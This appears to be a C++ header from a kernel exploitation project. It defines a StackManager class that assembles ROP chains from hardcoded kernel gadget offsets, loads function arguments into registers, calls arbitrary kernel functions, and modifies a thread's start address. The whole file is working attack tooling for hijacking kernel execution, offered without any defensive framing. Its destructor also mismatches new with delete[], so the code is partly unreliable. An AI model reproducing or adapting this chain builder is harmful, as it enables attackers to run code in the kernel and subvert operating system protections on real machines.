#pragma once
#include <vector>
#include <string_view>
#include <include/driver/kernel_addresses.hpp>

class StackManager
{
private:
	std::vector<std::uint64_t>* Stack = nullptr;
	std::uintptr_t KernelModuleBase = NULL;
	std::uintptr_t StackAddress = NULL;
	std::size_t StackSize = NULL;
    void ModifyThreadField(const std::uint64_t FieldOffset, const std::uint64_t NewValue);

public:
	StackManager(const std::uintptr_t _KernelModuleBase, const std::uintptr_t _StackAddress, const size_t _StackSize = 0x3000)
		: KernelModuleBase(_KernelModuleBase), StackAddress(_StackAddress), StackSize(_StackSize)
	{
		Stack = new std::vector<uint64_t>;
		//Stack->push_back(StackAddress + StackSize);
	}

	~StackManager()
	{
		delete[] Stack;
	}

    std::uint64_t* GetStackBuffer();
    std::size_t GetStackSize();
    void AddGadget(const std::uint64_t GadgetOffset);
    void AddValue(const std::uint64_t Value);
    void AddPadding(const std::size_t PaddingSize = 8);
    void ModifyThreadStartAddress(const std::uint64_t NewStartAddress);

    template<typename... Args>
    void AddFunctionCall(const std::string_view& FunctionName, Args&&... args)
    {
        constexpr std::size_t ArgCount = sizeof...(Args);
        const std::uint64_t FunctionAddress = Driver::GetKernelFunctionOffset(FunctionName);

        std::uintptr_t PopRaxGadget = 0x210e10; // pop rax; ret;

        // For this gadget, we must account for the 'add rsp, 8' by adding 8 byte padding so that it doesn't side-effect our stack
        std::uintptr_t CallRaxGadget = 0x6a9edf; // call rax; nop dword ptr [rax]; add rsp, 8; ret;

        std::uintptr_t PopRcxGadget = 0x256c4a; // pop rcx; ret;
        std::uintptr_t PopRdxGadget = 0x3cca89; // pop rdx; ret;
        std::uintptr_t PopR8Gadget = 0x2f7921; // pop r8; ret;
        std::uintptr_t PopR9Gadget = 0x6b4f23; // pop r9; ret;

        // Setup ropchain for arguments only if there are any
        if constexpr (ArgCount > 0)
        {
            std::uint64_t ConvertedArgs[] = { static_cast<std::uint64_t>(args)... };

            if (ArgCount >= 1)
            {
                this->AddGadget(PopRcxGadget);
                this->AddValue(ConvertedArgs[0]);
            }

            if (ArgCount >= 2)
            {
                this->AddGadget(PopRdxGadget);
                this->AddValue(ConvertedArgs[1]);
            }

            if (ArgCount >= 3)
            {
                this->AddGadget(PopR8Gadget);
                this->AddValue(ConvertedArgs[2]);
            }

            if (ArgCount >= 4)
            {
                this->AddGadget(PopR9Gadget);
                this->AddValue(ConvertedArgs[3]);
            }
        }

        // Setup ropchain for actual function call.
        // We pop function address into rax, then call it and keep an 8-byte padding
        // for the gadget's side effect
        this->AddGadget(PopRaxGadget);
        this->AddGadget(FunctionAddress);
        this->AddGadget(CallRaxGadget);
        this->AddPadding(8);
        //Stack->push_back(0xDEADBEEFDEADBEEF); // Our return address
    }
};
